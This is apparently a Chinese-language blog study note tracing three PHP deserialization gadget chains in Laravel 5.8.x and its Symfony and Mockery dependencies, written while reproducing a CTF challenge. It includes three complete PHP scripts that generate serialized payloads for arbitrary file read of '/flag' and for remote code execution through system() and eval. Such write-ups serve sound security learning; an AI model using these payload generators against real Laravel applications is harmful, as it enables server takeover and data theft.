---
title: "Laravel-5.8.x反序列化pop链学习"
slug: "laravel-5.8.x-pop-gadgets"
description: "3条链子捏"
date: 2021-12-04T14:11:02+08:00
categories: ["NOTES&SUMMARY"]
series: ["反序列化"]
tags: ["PHP", "unserialize", "laravel", "gadget"]
draft: false
toc: true
---

亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力

参考链接放在文末

------

## 链子1 - 文件包含/任意文件读取

搜索`__desturct()`找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php

![image-20211203153626429](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png)

它调用了`commit()`和`invalidateTags()`

![image-20211203164858978](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png)

![image-20211203164931565](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png)

调用pool的`saveDeferred()`方法，我们在这个类相同命名空间(Symfony\Component\Cache\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在`saveDeferred()`的类

![image-20211203165435637](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png)

找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php

![image-20211203165151335](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png)

它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php

![image-20211203165212155](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png)

是我们的文件包含点了，可以从这里读flag

接下来就是构造exp了，要注意命名空间和接口

![image-20211203170050397](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png)

![image-20211203170036701](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png)

![image-20211203170020908](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png)

![image-20211203165959349](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png)

前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use

```php
<?php
namespace Symfony\Component\Cache{
    final class CacheItem{
    }
}
namespace Symfony\Component\Cache\Adapter{
    use Symfony\Component\Cache\CacheItem;

    class PhpArrayAdapter{
        private $file='/flag';
    }
    class TagAwareAdapter{
        private $deferred;
        private $pool;
        public function __construct(){
            $this->deferred = array('amiz' => new CacheItem());
            $this->pool = new PhpArrayAdapter();
        }
    }
    $a = new TagAwareAdapter();
    echo urlencode(serialize($a));
}
```

## 链子2 - rce

回到前面在相同命名空间下找`saveDeferred()`的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php

![image-20211204102722908](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png)

跟进`doSave()`

![image-20211204102953831](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png)

223行可以动态调用函数，`setInnerItem`可控 我们可以调用`system()`，接下来确认它调用的两个参数可不可控

对于`$item`，是调用函数`doSave()`函数时传入的参数，也就是`saveDeferred()`时的参数，也就是我们传入的数组，可控

![image-20211204103425511](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png)

对于`$innerItem`有这样一个if判断

![image-20211204103829313](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png)

光看这个判断肥肠的突兀，还要结合207行的`$item = (array) $item;`，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 *protected*的属性冲突，所以需要在相同的命名空间里接着找一个类，包含`pollHash`和`innerItem`属性，最终还是找到了CacheItem（前面也是它

![image-20211204104546506](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png)

构造exp

```php
<?php

namespace Symfony\Component\Cache{
    final class CacheItem
    {
        protected $expiry;
        protected $poolHash;
        protected $innerItem;
        public function __construct($expiry, $poolHash, $command)
        {
            $this->expiry = $expiry;
            $this->poolHash = $poolHash;
            $this->innerItem = $command;
        }
    }
}

namespace Symfony\Component\Cache\Adapter{
    class ProxyAdapter
    {
        private $poolHash;
        private $setInnerItem;
        public function __construct($poolHash, $func)
        {
            $this->poolHash = $poolHash;
            $this->setInnerItem = $func;
        }
    }
    class TagAwareAdapter
    {
        private $deferred = [];
        private $pool;
        public function __construct($deferred, $pool)
        {
            $this->deferred = $deferred;
            $this->pool = $pool;
        }
    }
}

namespace {
    $cacheitem = new Symfony\Component\Cache\CacheItem(1,1,"dir");
    $proxyadapter = new Symfony\Component\Cache\Adapter\ProxyAdapter(1,'system');
    $tagawareadapter = new Symfony\Component\Cache\Adapter\TagAwareAdapter(array($cacheitem),$proxyadapter);
    echo urlencode(serialize($tagawareadapter));
}

```

本地尝试一下（懒得再开靶机了w

![image-20211204104738527](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png)

成功了捏

## 链子3 - rce

在 **[CISCN2019 总决赛 Day1 Web4]Laravel1**这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦

![image-20211204105214847](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png)

把这个注释取消即可

看到它调用了`events`的`dispatch`方法，跟上面思路一样，接着找一个可用的别的类里的`dispatch`，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php

![image-20211204110831694](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png)

看一下第一个判断的返回时调用的`dispatchNow()`是什么

![image-20211204133634260](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png)

150行有亮点啊，使用了`call_user_func`，第一个参数可控，第二个参数来自`$command`，也就是最开始找的析构函数调用的`$this->event`；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子

不过先不急，首先要满足`dispatch()`中的if判断`$this->queueResolver && $this->commandShouldBeQueued($command)`，前一个可控，看看后面这个

![image-20211204132803262](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png)

需要`$command`必须是一个实现了`ShouldQueue`接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php

![image-20211204133133796](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png)

然后接着找适合做`call_user_func()`第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php

![image-20211204135811389](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png)

这个`load()`可以直接调用eval执行代码，但是`$defination`要满足if的判断，跟进

![image-20211204140231175](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png)

![image-20211204140248303](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png)

需要额外再找两个类，第一个类具有`code`属性，第二类又`getName`函数，来作为第一个类的config属性

可用的第一个类就是`getClassName()`所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php

![image-20211204140502311](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png)

第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php

![image-20211204140537312](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png)

总结以上的过程，写exp

```php
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,'<?php phpinfo();?>');
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈

![image-20211204140752165](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png)

这个链子非常的长，涉及到6个类

------

pop链杀我！！！看代码有种目害的感觉了

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[Laravel POP链简析 ](https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1)  |  [Laravel5.8.x反序列化POP链](https://xz.aliyun.com/t/5911)

{{% /spoiler %}}